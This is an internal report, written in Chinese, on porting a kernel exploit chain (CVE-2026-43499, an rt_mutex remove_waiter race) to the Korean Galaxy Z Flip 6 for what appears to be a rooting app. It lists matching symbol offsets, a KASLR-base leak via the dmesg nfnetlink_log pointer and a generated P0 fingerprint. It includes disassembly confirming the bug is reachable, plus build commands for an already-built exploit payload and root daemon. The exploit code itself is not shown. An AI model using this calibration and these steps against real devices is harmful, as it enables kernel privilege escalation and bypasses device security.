# SM-F741N（韩版 Galaxy Z Flip 6）DZE1 内核分析报告

> 日期：2026-10-18
> 状态：**分析完成，暂不接入**（2026-10-18 决定：韩版折叠机型先不加入 App，仅保留分析存档）
> 素材：`/home/nt/下载/download.img`（= `boot.2.zip` 内 `boot.img`，
> `SM-F741N_KOR_KX_QKEY2`，Samsung 签名 2026-05-15 16:00:43）
> 参考：美版 S926U1 DZE2（`e2q-S926USQS6DZE2`，已定标 issue #10）、
> 港版 S9280 DZE2（`e3q-S9280ZHS6DZE2`，已真机验证）

---

## 1. 内核信息

| 项 | SM-F741N DZE1 | 美版 S926U1 DZE2 | 港版 S9280 DZE2 |
|---|---|---|---|
| 内核版本 | `6.1.145-android14-11-33418572-abF741NKSS4DZE1` | `…-33419968-abS926USQS6DZE2` | `…-33419968-abS9280ZHS6DZE2` |
| 构建号 | **33418572** | 33419968 | 33419968 |
| 构建时间 | 2026-05-15 05:58 UTC | 2026-05-18 08:39 UTC | 2026-05-19 09:26 UTC |
| 编译器 | clang 17.0.2 (r487747c) | 同 | 同 |
| KIMAGE_TEXT_BASE | `0xffffffc008000000` | 同 | 同 |
| ARM64 Image 头 | text_offset=0, image_size=0x26f0000, flags=0xa | 同 | 同 |
| 恢复出的 ELF | `devices_ports/f741n_unpacked/vmlinux_f741n_dze1.elf`（43 MB，107,253 条符号记录） | `devices_ports/dze2_xaa_unpacked/vmlinux_dze2_xaa.elf` | `devices_ports/dze2_unpacked/vmlinux_dze2.elf` |

结论：F741N 与两台已定标的 DZE2 参考机**同一内核分支（6.1.145 / clang 17.0.2 /
同 KIMAGE）**，构建时间仅早 3–4 天。

---

## 2. 符号级对比（核心结论）

方法：`llvm-nm -n --defined-only` 提取 三份 ELF 的 `(name,type) → addr` 全表，
按 `name+type` 对齐比较（103,520 个键；107,253 条记录含同名多地址条目）。

### 2.1 F741N vs 美版 S926U1 DZE2

- 公共符号：**103,520**
- 地址不同：**2**（全部是 `.rodata` 局部字符串标签，`t` 类型，偏移 +0x2e）：

| 符号 | F741N | 美版 S926U1 |
|---|---|---|
| `task_index_to_char.state_char` | `0xffffffc009717c0e` | `0xffffffc009717be0` |
| `zero_mask` | `0xffffffc009707c98` | `0xffffffc009707c6a` |

即：**代码段、数据段、所有全局/静态函数与变量地址 100% 一致**，仅两条打印用
字符串常量因构建差异前移 0x2e。

### 2.2 F741N vs 港版 S9280 DZE2

- 地址不同：**6** —— 5 项 `+0x2e`、1 项相关 `+0x3c`，样本：
  `f_midi_longname`、`pty_line_name.ptychar`、`task_index_to_char.state_char`、
  `f_midi_shortname`、`trunc_msg`、`max_tt_usecs`。
- 与已知「美版 ↔ 港版 .rodata 字符串区整体偏移」模式完全一致（美版较港版
  **提前 0x2e**；e2q 定标时 7 项、本次 6 项，属同类差异）。

### 2.3 关键锚点符号（三内核逐项核对）

| 符号 | 偏移（相对 KIMAGE_TEXT_BASE） | 三内核一致 |
|---|---|---|
| `call_usermodehelper_exec_work` | `0x000d39cc` | ✅ |
| `anon_pipe_buf_ops` | `0x01219d90` | ✅ |
| `ashmem_fops` | `0x013d1140` | ✅ |
| `kmalloc_caches` | `0x0176c6f8` | ✅ |
| `system_unbound_wq` | `0x0223ae60` | ✅ |
| `nfulnl_logger` | `0x02242a20` | ✅ |
| `init_task` | `0x0224f8c0` | ✅ |
| `root_task_group` | `0x0244cd80` | ✅ |
| `selinux_state` | `0x02521588` | ✅ |
| `sysctl_bootid` | `0x026046e8` | ✅ |

`anon_pipe_buf_ops` 结构体在原始 Image `0x1219d90` 处的 32 字节内容三内核逐字节
相同（`0000000000000000 a0213b08c0ffffff …`），pipe/physrw 链依赖的 ops 指针一致。

---

## 3. nfnetlink_log 字符串偏移（唯一需要重标的项）

`slide_app.c` 用 `SLIDE_NFULNL_LOGGER_OFF`（`nfulnl_logger.name` 指向的
`"nfnetlink_log"` 字符串在 Image 内的偏移）从 dmesg 泄漏指针反推 KASLR base。

实测（原始 Image 字节 + `nfulnl_logger` 结构体首 qword 双重验证）：

| 内核 | Image 内字符串偏移 | `nfulnl_logger+0` 指针值 | `SLIDE_NFULNL_LOGGER_OFF` |
|---|---|---|---|
| **F741N** | **`0x016a61b8`** | `0xffffffc0096a61b8` | **`0x016a61b8`（美版布局）** |
| 美版 S926U1 | `0x016a61b8` | `0xffffffc0096a61b8` | `0x016a61b8` |
| 港版 S9280 | `0x016a61e6` | `0xffffffc0096a61e6` | `0x016a61e6` |

→ **F741N 该字符串与美版同址，与港版差 0x2e**。因此如果复用美版
`e2q-S926USQS6DZE2` 的 target.h，`SLIDE_NFULNL_LOGGER_OFF` **无需修改**；
若复用港版 `e3q-S9280ZHS6DZE2` 则必须改为 `0x016a61b8`。

---

## 4. P0 指纹（p0_fingerprint.h）

用仓库自带工具对 F741N 原始 Image（probe `0x1f0000`，与 e2q/e3q 一致）生成：

```bash
perl Root-My-Galaxy-Payloads/tools/generate_p0_fingerprint.pl \
     devices_ports/f741n_unpacked/kernel 0x1f0000 \
     devices_ports/f741n_dze1_draft/p0_fingerprint.h
# verified 32 rows and 256 source qwords at probe 0x1f0000
```

对比结果（32 行 × 8 qword = 256 qword）：

| 对比对象 | 差异 |
|---|---|
| 美版 e2q（S926U1）指纹 | **1 个 qword**：`slide=0xa0000` 行第 2 个 qword `0x9106d0219000b001`（F741N）vs `0x9105e0219000b001`（美版） |
| 港版 e3q（S9280）指纹 | **0 个 qword**（256/256 相同） |

同一套生成管线可信度验证：用美版 `dze2_xaa_unpacked/kernel` 重新生成的指纹与
仓库中已定标的 `e2q-S926USQS6DZE2/p0_fingerprint.h` **逐字节一致**。

→ F741N 的指纹与美版/港版都不同（与港版相同、与美版差 1 qword），**必须使用
自己生成的那一份**（已保存为 `devices_ports/f741n_dze1_draft/p0_fingerprint.h`）。

---

## 5. CVE-2026-43499 链前提复核（remove_waiter）

三内核 `remove_waiter`（VA `0xffffffc00911fcb8`，偏移 `0x0111fcb8`，函数范围
`0x268` 字节 / 154 条指令）反汇编**逐字节完全相同**（F741N vs 美版、F741N vs 港版
`diff` 均为空）。按 W23 复核文档的同一方法逐项确认：

### 5.1 清空 `pi_blocked_on` 的写指令用的是 `current`

全函数只有两处访问 `+0x950`：

```
36: f904aa9f      str     xzr, [x20, #0x950]     ; ← 唯一写
106: f944aaa8     ldr     x8, [x21, #0x950]      ; owner->pi_blocked_on（读）
```

`x20` 的唯一来源：

```
15: d5384114      mrs     x20, SP_EL0            ; arm64: SP_EL0 == current
16: 91249296      add     x22, x20, #0x924       ; &current->pi_lock
20: 9400097d      bl      _raw_spin_lock
...
36: f904aa9f      str     xzr, [x20, #0x950]     ; current->pi_blocked_on = NULL  ← 漏洞写
37: 94000a00      bl      _raw_spin_unlock
```

即：该函数清的是 **`current->pi_blocked_on`**，而不是上游补丁要求的
**`waiter->task->pi_blocked_on`**；全函数**不存在**任何以 `waiter->task` 为基址、
写 `+0x950` 的指令。

### 5.2 `0x950 == task_struct::pi_blocked_on`（同内核反向验证）

同一内核的 `task_blocks_on_rt_mutex`（`0xffffffc00911f7f0`）里存在反向操作：

```
ffffffc00911f914: f904aa95      str     x21, [x20, #0x950]   ; task->pi_blocked_on = waiter
```

且 `remove_waiter` 内另一处读 `[x21,#0x950]`（`x21 = rt_mutex_owner(lock)`）用于
取 owner 的阻塞 waiter —— 三路一致锁定 `+0x950` 语义。PI 簇偏移：
`pi_lock 0x924` / `pi_waiters 0x938` / `pi_waiters.rb_leftmost 0x940` /
`pi_blocked_on 0x950`，与 6.1 DZE2 系列一致。

### 5.3 该写位于「`waiter->task != current`」的活路径

`remove_waiter` 的调用点（全镜像 BL 扫描）：

| 调用点 | 所在函数 | 说明 |
|---|---|---|
| `0xffffffc00911fc64` | `rt_mutex_start_proxy_lock` | waiter/task 为入参，可与 current 不同 |
| `0xffffffc00912023c` | `rt_mutex_cleanup_proxy_lock` | owner 与 current 不同时调用（proxy lock 清理） |
| `0xffffffc009120e7c` | `rt_mutex_slowlock` | 自身阻塞出队路径 |

即：该 store 不是死代码，`waiter->task != current` 的死锁回滚路径确实存在，
「清 current 而非 waiter->task」的竞态窗口在 F741N 上**同样存在**，
现有 exploit 链假设成立。

## 6. 原始 Image 整体差异（仅供参考）

| 对比 | 差异字节 | 差异区间 | 说明 |
|---|---|---|---|
| F741N vs 美版 S926U1 | 451,363 B（37.9 MB 中） | 15,911 段 | 3 天源码 + 地区配置差异 |
| F741N vs 港版 S9280 | 864,082 B | 21,863 段 | 上述 + 美/港构建配置差异 |

尽管函数内字节有差异（构建/配置不同），**符号地址表完全一致**（第 2 节），
这是 exploit 定标真正依赖的部分。

---

## 6.5 编译验证（draft target 全链路）

用 draft target 在本机跑通完整构建（`/tmp` 副本，未改动仓库目标列表）：

```bash
TARGET=b6q-F741NKSS4DZE1 ANDROID_NDK_HOME=.../android-ndk-r29 \
  make TARGET=b6q-F741NKSS4DZE1 stable all
```

产物（已归档到 `devices_ports/f741n_dze1_draft/`）：

| 文件 | 大小 | 说明 |
|---|---|---|
| `cve-2026-43499-app.stable.so` | **104,128 B** | App 载荷，尺寸与 App 现有 DZE2 资产完全一致 |
| `cve-2026-43499-root` | 27,496 B | root 守护进程（App 流程实际复用 `cve-2026-43499-root` 共享资产，此产物仅作编译验证） |

构建出的 payload 内嵌标签 `b6q-F741NKSS4DZE1-app-physical-p0-oracle` 正确；
编译无 error（仅 `root.c` 一个既有 unused-function warning）。

## 7. 结论与建议

1. **F741N DZE1 与美版 S926U1 DZE2 内核布局几乎全等**：103,520 个符号中仅 2 个
   `.rodata` 字符串标签差 0x2e，所有代码/数据符号、Image 头、P0 装载假设、
   pipe/physrw 依赖的 ops、CVE 链 remove_waiter 全部一致。
2. **适配成本极低**：以美版 `e2q-S926USQS6DZE2` 为模板新建
   `b6q-F741NKSS4DZE1` target，只需要：
   - 新 `p0_fingerprint.h`（**已生成**：`devices_ports/f741n_dze1_draft/p0_fingerprint.h`）；
   - 改 `BUILD_VARIANT_LABEL` / `P0_FINGERPRINT_HEADER` 路径；
   - 补 `BUILD_FINGERPRINT`（待用户提供 `getprop ro.build.fingerprint`）；
   - **无需修改任何 `*_OFF`**（含 `SLIDE_NFULNL_LOGGER_OFF = 0x016a61b8`）。
   已按此生成 draft：`devices_ports/f741n_dze1_draft/target.h.draft`。
3. **出载荷**（待决策）：载荷**已预先构建并通过尺寸校验**
   （`devices_ports/f741n_dze1_draft/cve-2026-43499-app.stable.so`，104,128 B）；
   App 侧只需增加 FirmwareVersion 条目 + 把该文件放进 assets；
   KMI 为 `android14-6.1`，复用现有 6.1 ksud 资产。
4. **待用户提供**：F741N 设备的 `ro.build.fingerprint`（或完整固件 AP，
   从 system 分区 `build.prop` 提取）。该字符串仅作 target 元数据，不参与
   编译产物逻辑（全仓库 grep 确认 `BUILD_FINGERPRINT` 只在 target.h 定义）。
5. **风险**：与 e2q/e3q 同级（exploit 本身概率性，失败/重启属正常）；未发现
   新的内核侧阻塞点。

---

## 8. 证据与产物索引

| 文件 | 说明 |
|---|---|
| `devices_ports/f741n_unpacked/kernel` | 从 boot.img 解出的原始 ARM64 Image（38,005,248 B） |
| `devices_ports/f741n_unpacked/vmlinux_f741n_dze1.elf` | 恢复的带符号 ELF（43 MB，`vmlinux-to-elf`） |
| `devices_ports/f741n_dze1_draft/p0_fingerprint.h` | 用 F741N Image 生成、脚本自校验通过的 P0 指纹 |
| `devices_ports/f741n_dze1_draft/target.h.draft` | 以 e2q 为模板的 target 草案（TODO：BUILD_FINGERPRINT） |
| `devices_ports/f741n_dze1_draft/cve-2026-43499-app.stable.so` | 用 draft target 构建的 App 载荷（104,128 B，尺寸校验通过） |
| `devices_ports/dze2_xaa_unpacked/` | 美版 S926U1 DZE2 参考（本次对比基准） |
| `devices_ports/dze2_unpacked/` | 港版 S9280 DZE2 参考 |

复现命令：

```bash
# 符号对比
llvm-nm -n --defined-only vmlinux_f741n_dze1.elf > f741n.nm
llvm-nm -n --defined-only vmlinux_dze2_xaa.elf  > xaa.nm
# 关键偏移（nfnetlink_log）
python3 - <<'PY'
import struct
d=open('kernel','rb').read(); BASE=0xffffffc008000000
i=d.find(b'nfnetlink_log\x00'); print(hex(i))
print(hex(struct.unpack_from('<Q',d,0x2242a20)[0]-BASE))
PY
# P0 指纹
perl tools/generate_p0_fingerprint.pl kernel 0x1f0000 out.h
# remove_waiter
llvm-objdump -d --start-address=0xffffffc00911fcb8 \
  --stop-address=0xffffffc00911ff20 vmlinux_f741n_dze1.elf
```
